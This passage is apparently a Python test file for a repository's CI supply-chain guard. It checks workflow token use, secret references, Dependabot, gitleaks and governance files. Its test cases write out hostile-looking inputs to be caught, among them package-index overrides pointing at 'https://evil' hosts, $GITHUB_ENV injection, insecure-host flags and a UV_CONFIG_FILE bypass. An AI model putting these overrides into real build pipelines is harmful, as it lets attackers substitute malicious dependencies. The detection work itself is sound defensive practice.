    assert permission_violations("other.yml", release) != []


def test_github_token_is_allowed_only_in_the_listed_job() -> None:
    workflow = minimal_workflow()
    workflow["jobs"]["a"]["steps"].append({"run": "gh release list", "env": {"GH_TOKEN": "${{ github.token }}"}})
    raw = "          GH_TOKEN: ${{ github.token }}\n"
    # A file with no allowance is scanned as text.
    assert github_token_violations("ci.yml", workflow, raw) == [raw.rstrip("\n")]
    # A file with an allowance is scanned job by job.
    assert github_token_violations("publish.yml", workflow, raw) == ["publish.yml:a: github.token"]
    workflow["jobs"]["release"] = workflow["jobs"].pop("a")
    assert github_token_violations("publish.yml", workflow, raw) == []
    workflow["env"] = {"GH_TOKEN": "${{ github.token }}"}
    assert github_token_violations("publish.yml", workflow, raw) == ["publish.yml: github.token outside the jobs"]


def test_planted_secrets_and_registry_overrides_are_found() -> None:
    assert secret_lines("run: echo ${{ secrets.TOKEN }}\n# secrets are not used\nrun: echo hi\n") == [
        "run: echo ${{ secrets.TOKEN }}"
    ]
    assert secret_lines("secrets: inherit\n") == ["secrets: inherit"]
    assert secret_lines("# secrets mention only in a comment\n") == []
    assert github_token_lines("        env:\n          GH_TOKEN: ${{ github.token }}\n") == [
        "          GH_TOKEN: ${{ github.token }}"
    ]
    assert github_token_lines("          token: ${{github.token}}\n") == ["          token: ${{github.token}}"]
    assert github_token_lines("          t: ${{ github['token'] }}\n") == ["          t: ${{ github['token'] }}"]
    assert github_token_lines("# no github.token is handed to a step\n          repo: ${{ github.repository }}\n") == []
    assert registry_violations("ci.yml", minimal_workflow()) == []
    cases: list[tuple[str, Callable[[Workflow], object]]] = [
        ("workflow", lambda w: w.setdefault("env", {}).update(UV_PUBLISH_TOKEN="x")),
        ("job", lambda w: w["jobs"]["a"].setdefault("env", {}).update(UV_INDEX_URL="x")),
        ("step", lambda w: w["jobs"]["a"]["steps"][0].setdefault("env", {}).update(NODE_AUTH_TOKEN="x")),
        ("step", lambda w: w["jobs"]["a"]["steps"][0].setdefault("env", {}).update(PIP_INDEX_URL="x")),
        ("step", lambda w: w["jobs"]["a"]["steps"][0].setdefault("env", {}).update(TWINE_PASSWORD="x")),
        ("registry-url", lambda w: w["jobs"]["a"]["steps"][0]["with"].update({"registry-url": "x"})),
        ("index flag", lambda w: w["jobs"]["a"]["steps"].append({"run": "uv sync --index-url https://x"})),
        ("index flag", lambda w: w["jobs"]["a"]["steps"].append({"run": "pip install -i https://x y"})),
        ("fused -i", lambda w: w["jobs"]["a"]["steps"].append({"run": "pip install -ihttps://evil x"})),
        ("UV_CONFIG_FILE", lambda w: w["jobs"]["a"]["steps"][0].setdefault("env", {}).update(UV_CONFIG_FILE="x.toml")),
        ("UV_INSECURE_HOST", lambda w: w["jobs"]["a"].setdefault("env", {}).update(UV_INSECURE_HOST="x")),
        ("UV_INSECURE_NO_VERIFY", lambda w: w.setdefault("env", {}).update(UV_INSECURE_NO_VERIFY="1")),
        ("UV_PYTHON_INSTALL_MIRROR", lambda w: w.setdefault("env", {}).update(UV_PYTHON_INSTALL_MIRROR="x")),
        ("UV_KEYRING_PROVIDER", lambda w: w.setdefault("env", {}).update(UV_KEYRING_PROVIDER="subprocess")),
        ("NPM_TOKEN", lambda w: w.setdefault("env", {}).update(NPM_TOKEN="x")),
        ("--config-file", lambda w: w["jobs"]["a"]["steps"].append({"run": "uv sync --config-file ci/uv-ci.toml"})),
        ("--allow-insecure-host", lambda w: w["jobs"]["a"]["steps"].append({"run": "uv sync --allow-insecure-host x"})),
        (
            "--keyring-provider",
            lambda w: w["jobs"]["a"]["steps"].append({"run": "uv sync --keyring-provider subprocess"}),
        ),
        ("inline env", lambda w: w["jobs"]["a"]["steps"].append({"run": "UV_CONFIG_FILE=ci-uv.conf uv sync --locked"})),
        ("inline index env", lambda w: w["jobs"]["a"]["steps"].append({"run": "UV_INDEX_URL=https://evil uv sync"})),
        ("export", lambda w: w["jobs"]["a"]["steps"].append({"run": "export UV_CONFIG_FILE=ci-uv.conf\nuv sync"})),
        ("GITHUB_ENV", lambda w: w["jobs"]["a"]["steps"].append({"run": 'echo "UV_CONFIG_FILE=x" >> "$GITHUB_ENV"'})),
        (
            "GITHUB_ENV printf",
            lambda w: w["jobs"]["a"]["steps"].append({"run": "printf 'PIP_INDEX_URL=x' >> $GITHUB_ENV"}),
        ),
        ("-f", lambda w: w["jobs"]["a"]["steps"].append({"run": "pip install -f ./wheels x"})),
        ("fused -f", lambda w: w["jobs"]["a"]["steps"].append({"run": "uv pip install -f./wheels x"})),
        ("--find-links", lambda w: w["jobs"]["a"]["steps"].append({"run": "pip install --find-links ./w x"})),
        ("--trusted-host", lambda w: w["jobs"]["a"]["steps"].append({"run": "pip install --trusted-host h x"})),
        ("uvx -i", lambda w: w["jobs"]["a"]["steps"].append({"run": "uvx -i https://evil ruff"})),
        ("--registry", lambda w: w["jobs"]["a"]["steps"].append({"run": "bun install --registry https://evil/"})),
        ("--registry=", lambda w: w["jobs"]["a"]["steps"].append({"run": "npm ci --registry=https://evil/"})),
    ]
    for label, mutate in cases:
        bad = minimal_workflow()
        mutate(bad)
        assert registry_violations("ci.yml", bad) != [], label


def test_the_short_index_flag_counts_only_on_pip_and_uv_command_lines() -> None:
    for run in (
        "sed -i 's/a/b/' file",
        "echo done -i",
        "grep -i needle haystack",
        "uv run pytest | grep -i fail",
        "uv sync && sed -i s/a/b/ f",
        "git config -i",
        "uv run pytest | grep -f patterns",
        "echo UV_THING_OK",
    ):
        assert not has_index_flag(run), run
    for run in (
        "uv pip install -i https://x y",
        "pip install -i https://x y",
        "pip3 install -ihttps://x y",
        "uv pip install \\\n  -r r.txt \\\n  -i https://x",
        "echo ok; uv pip install -i https://x",
        "uv sync --config-file ci/uv-ci.toml",
    ):
        assert has_index_flag(run), run


def test_registry_env_set_inside_a_run_line_is_found_but_flags_in_prose_are_not() -> None:
    for run in (
        "UV_CONFIG_FILE=ci-uv.conf uv sync --locked",
        "export UV_CONFIG_FILE=ci-uv.conf",
        'echo "UV_CONFIG_FILE=ci-uv.conf" >> "$GITHUB_ENV"',
        "echo UV_INDEX_URL >> $GITHUB_ENV",
        "NPM_TOKEN=x npm ci",
    ):
        assert sets_registry_env(run), run
    for run in (
        "uv sync --locked",
        "echo $UV_CACHE_DIR",
        'echo "CACHE=x" >> "$GITHUB_ENV"',
        "echo no-UV_INDEX_URL here",
    ):
        assert not sets_registry_env(run), run


def test_the_uv_config_file_bypass_turns_the_policy_test_and_the_guard_red(tmp_path: Path) -> None:
    """A checked-in uv config with a foreign index, pointed at by UV_CONFIG_FILE on a CI step."""
    bypass = copy.deepcopy(CI)
    assert registry_violations("ci.yml", bypass) == []
    sync = next(s for s in steps(jobs(bypass)["gate"]) if "uv sync" in s.get("run", ""))
    sync["env"] = {"UV_CONFIG_FILE": "ci/uv-ci.toml"}
    assert registry_violations("ci.yml", bypass) == ["ci.yml:gate: step env UV_CONFIG_FILE"]
    (tmp_path / "ci").mkdir()
    (tmp_path / "ci/uv-ci.toml").write_text('index-url = "https://pkgs.example.internal/simple"\n', encoding="utf-8")
    (tmp_path / "pyproject.toml").write_text(read("pyproject.toml"), encoding="utf-8")
    assert {(v.file, v.kind) for v in find_violations(tmp_path)} == {("ci/uv-ci.toml", "foreign-registry")}


def test_planted_job_name_and_strategy_problems_are_found() -> None:
    assert job_name_violations({"a.yml": minimal_workflow()}) == []
    unnamed = copy.deepcopy(minimal_workflow())
    del unnamed["jobs"]["a"]["name"]
    assert job_name_violations({"a.yml": unnamed}) == ["a.yml:a has no name"]
    assert job_name_violations({"a.yml": minimal_workflow(), "b.yml": minimal_workflow()}) == ["a"]
    matrix = minimal_workflow()
    matrix["jobs"]["a"]["strategy"] = {"matrix": {"os": ["x"]}}
    assert strategy_violations(matrix) == ["a has a strategy"]


# --- dependabot, hooks, scanning, governance files ------------------------------------------------


def test_dependabot_covers_uv_and_github_actions_with_bounded_prs() -> None:
    config = yaml.safe_load(read(".github/dependabot.yml"))
    updates = {u["package-ecosystem"]: u for u in config["updates"]}
    assert sorted(updates) == ["github-actions", "uv"]
    for update in updates.values():
        assert update["directory"] == "/"
        assert update["schedule"]["interval"] == "monthly"
        assert update["open-pull-requests-limit"] <= 3
        assert "allow" not in update


def test_pre_commit_hook_runs_the_guard_and_is_executable() -> None:
    hook = ROOT / ".githooks/pre-commit"
    assert hook.read_text(encoding="utf-8").startswith("#!/bin/sh\n")
    assert "scripts/check_private_deps.py" in hook.read_text(encoding="utf-8")
    assert "uv run --locked" in hook.read_text(encoding="utf-8")
    assert os.access(hook, os.X_OK)


# The only gitleaks exceptions: two fake values planted in tests, each by its exact value. Anything else that gitleaks
# finds in the tree is a finding. The values are split so that this file does not hold them.
GITLEAKS_ALLOWED = {
    ("tests/test_client_api.py", "rt-SECRET-" + "0123456789"),
    ("tests/test_sp_credential.py", "hunter2-" + "planted"),
}


def test_gitleaks_extends_the_default_rules_and_allows_only_the_planted_test_values() -> None:
    config = tomllib.loads(read(".gitleaks.toml"))
    assert config["extend"] == {"useDefault": True}
    assert "allowlist" not in config
    # One escaped, anchored value per entry and no `paths`: a path entry would allow every finding in that file.
    assert all(set(entry) == {"description", "regexes"} for entry in config["allowlists"])
    assert sorted(entry["regexes"] for entry in config["allowlists"]) == sorted(
        [f"^{re.escape(value)}$"] for _, value in GITLEAKS_ALLOWED
    )
    for file, value in GITLEAKS_ALLOWED:
        assert value in read(file), (file, value)


def test_dco_is_required_and_documented() -> None:
    contributing = read("CONTRIBUTING.md")
    assert "Signed-off-by:" in contributing
    assert "git commit -s" in contributing
    assert "Developer Certificate of Origin" in contributing


def test_codeowners_covers_everything_and_the_contract_record() -> None:
    lines = [line.split() for line in read("CODEOWNERS").split("\n") if line and not line.startswith("#")]
    patterns = {parts[0]: parts[1:] for parts in lines}
    assert patterns["*"]
    assert patterns["/contract.json"]


def test_security_policy_and_provenance_exist() -> None:
    assert "Reporting a vulnerability" in read("SECURITY.md")
    assert "Provenance" in read("PROVENANCE.md")


def test_line_endings_are_pinned_to_lf() -> None:
    assert "* text=auto eol=lf" in read(".gitattributes").split("\n")
